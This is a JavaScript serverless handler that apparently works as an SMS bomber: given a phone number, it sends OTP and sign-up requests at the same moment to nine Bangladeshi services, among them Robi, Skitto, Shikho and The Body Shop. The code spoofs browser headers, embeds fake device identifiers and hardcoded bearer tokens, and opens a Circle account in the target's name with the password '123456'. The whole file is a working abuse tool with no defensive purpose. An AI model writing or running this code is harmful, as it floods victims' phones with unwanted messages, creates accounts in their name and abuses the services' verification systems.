export default async function handler(req, res) {
    if (req.method !== 'GET') {
        return res.status(405).json({ error: 'Method Not Allowed' });
    }

    const { phone } = req.query;
    if (!phone) {
        return res.status(400).json({ error: 'Phone number is required' });
    }

    // API URLs
    const bodyshopUrl = "https://www.thebodyshop.com.bd/smspro/customer/register/";
    const keplerUrl = "https://api.bdkepler.com/api_middleware-0.0.1-RELEASE/registration-generate-otp";
    const sundarUrl = "https://api-gateway.sundarbancourierltd.com/graphql";
    const shomvobUrl = "https://backend-api.shomvob.co/api/v2/otp/phone?is_retry=0";
    const skittoUrl = `https://www.skitto.com/replace-sim/sent-otp/${phone}`;
    const shikhoUrl = "https://api.shikho.com/auth/v2/send/sms";
    const sinorBeautyUrl = "https://www.sinorbeauty.com/ajax";
    const shebaUrl = 'https://accounts.sheba.xyz/api/v1/accountkit/generate/token?app_id=8329815A6D1AE6DD';
    const robiUrl = "https://webapi.robi.com.bd/v1/send-otp";  // Robi API URL
    const circleUrl = "https://reseller.circle.com.bd/api/v2/auth/signup";

    // Sheba API Request for generating token
    const shebaTokenHeaders = {
        "Content-Type": "application/json",
    };

    // Bodyshop API Request
    const bodyshopHeaders = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.5",
        "Content-Type": "application/x-www-form-urlencoded",
        "X-Requested-With": "XMLHttpRequest",
        "Origin": "https://www.thebodyshop.com.bd",
        "Referer": "https://www.thebodyshop.com.bd/customer/account/create/",
        "Connection": "keep-alive",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "TE": "trailers"
    };
    const bodyshopBody = new URLSearchParams({ mobile: `88${phone}` }).toString();

    // Kepler API Request
    const keplerHeaders = {
        "Content-Type": "application/json",
    };
    const keplerBody = JSON.stringify({
        "deviceId": "7dtdhid45c0f0901",
        "deviceInfo": {
            "deviceInfoSignature": "D0923F3GDHJXJDTIHFDTIGGHURHFATI7605A3FA",
            "deviceId": "7d8b0agi0g0f0901",
            "firebaseDeviceToken": "",
            "manufacturer": "MI",
            "modelName": "NOTE 10",
            "osFirmWireBuild": "",
            "osName": "Android",
            "osVersion": "10",
            "rootDevice": 0
        },
        "operator": "Gp",
        "walletNumber": phone
    });

    // Sundar API Request
    const sundarHeaders = {
        "Content-Type": "application/json",
        "Host": "api-gateway.sundarbancourierltd.com",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0)",
        "Accept-Language": "en-US,en;q=0.5",
        "Referer": "https://customer.sundarbancourierltd.com/",
        "Origin": "https://customer.sundarbancourierltd.com",
        "Content-Length": JSON.stringify({
            "operationName": "CreateAccessToken",
            "variables": {
                "accessTokenFilter": {
                    "userName": phone
                }
            },
            "query": "mutation CreateAccessToken($accessTokenFilter: AccessTokenInput!) { createAccessToken(accessTokenFilter: $accessTokenFilter) { message statusCode result { phone otpCounter __typename } __typename } }"
        }).length.toString()
    };
    const sundarBody = JSON.stringify({
        "operationName": "CreateAccessToken",
        "variables": {
            "accessTokenFilter": {
                "userName": phone
            }
        },
        "query": "mutation CreateAccessToken($accessTokenFilter: AccessTokenInput!) { createAccessToken(accessTokenFilter: $accessTokenFilter) { message statusCode result { phone otpCounter __typename } __typename } }"
    });

    // Shomvob API Request
    const shomvobHeaders = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
        "Content-Type": "application/json",
        "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IlNob212b2JUZWNoQVBJVXNlciIsImlhdCI6MTY2MzMzMDkzMn0.4Wa_u0ZL_6I37dYpwVfiJUkjM97V3_INKVzGYlZds1s"
    };
    const shomvobBody = JSON.stringify({
        "phone": phone
    });

    // Skitto API Request
    const skittoHeaders = {
        "Content-Type": "application/json"
    };

    // Shikho API Request
    const shikhoHeaders = {
        "Content-Type": "application/json",
    };
    const shikhoBody = JSON.stringify({
        'phone': phone,
        'type': 'student',
        'auth_type': 'signup',
        'vendor': 'shikho'
    });

    // Sinor Beauty API Request
    const sinorBeautyHeaders = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/537.13 (KHTML, like Gecko) Chrome/24.0.1290.1 Safari/537.13",
        "Content-Type": "application/x-www-form-urlencoded",
    };
    const sinorBeautyBody = new URLSearchParams({
        "sendVerifyOtp": phone
    }).toString();

    // Circle API Request
    const circleData = {
        "name": `+88${phone}`,
        "email_or_phone": `+88${phone}`,
        "password": "123456",
        "password_confirmation": "123456",
        "register_by": "phone"
    };
    const circleHeaders = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)"
    };

    // Robi API Request
    const robiHeaders = {
        "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJnaGd4eGM5NzZoaiIsImlhdCI6MTY5MjY0MjcyOCwibmJmIjoxNjkyNjQyNzI4LCJleHAiOjE2OTI2NDYzMjgsInVpZCI6IjU3OGpmZkBoZ2hoaiIsInN1YiI6IlJvYmlXZWJTaXRlVjIifQ.5xbPa1JiodXeIST6v9c0f_4thF6tTBzaLLfuHlN7NSc",
        "Content-Type": "application/json",
    };
    const robiBody = JSON.stringify({
        "phone_number": phone,
        "type": "doorstep"
    });

    try {
        // Send OTP to all APIs including Robi
        const [bodyshopResponse, keplerResponse, sundarResponse, shomvobResponse, skittoResponse, shikhoResponse, sinorBeautyResponse, robiResponse, circleOtpResponse] = await Promise.all([
            fetch(bodyshopUrl, { method: 'POST', headers: bodyshopHeaders, body: bodyshopBody }),
            fetch(keplerUrl, { method: 'POST', headers: keplerHeaders, body: keplerBody }),
            fetch(sundarUrl, { method: 'POST', headers: sundarHeaders, body: sundarBody }),
            fetch(shomvobUrl, { method: 'POST', headers: shomvobHeaders, body: shomvobBody }),
            fetch(skittoUrl, { method: 'GET', headers: skittoHeaders }),
            fetch(shikhoUrl, { method: 'POST', headers: shikhoHeaders, body: shikhoBody }),
            fetch(sinorBeautyUrl, { method: 'POST', headers: sinorBeautyHeaders, body: sinorBeautyBody }),
            fetch(robiUrl, { method: 'POST', headers: robiHeaders, body: robiBody }),
            fetch(circleUrl, { method: 'POST', headers: circleHeaders, body: JSON.stringify(circleData) })
        ]);

        const bodyshopResult = await bodyshopResponse.text();
        const keplerResult = await keplerResponse.text();
        const sundarResult = await sundarResponse.text();
        const shomvobResult = await shomvobResponse.text();
        const skittoResult = await skittoResponse.text();
        const shikhoResult = await shikhoResponse.text();
        const sinorBeautyResult = await sinorBeautyResponse.text();
        const robiResult = await robiResponse.text();
        const circleOtpResult = await circleOtpResponse.text();

        res.json({
            bodyshop: bodyshopResult,
            kepler: keplerResult,
            sundar: sundarResult,
            shomvob: shomvobResult,
            skitto: skittoResult,
            shikho: shikhoResult,
            sinorBeauty: sinorBeautyResult,
            robi: robiResult,
            circleOtp: circleOtpResult
        });
    } catch (error) {
        console.error("Error in API calls", error);
        res.status(500).json({ error: 'Internal Server Error' });
    }
}

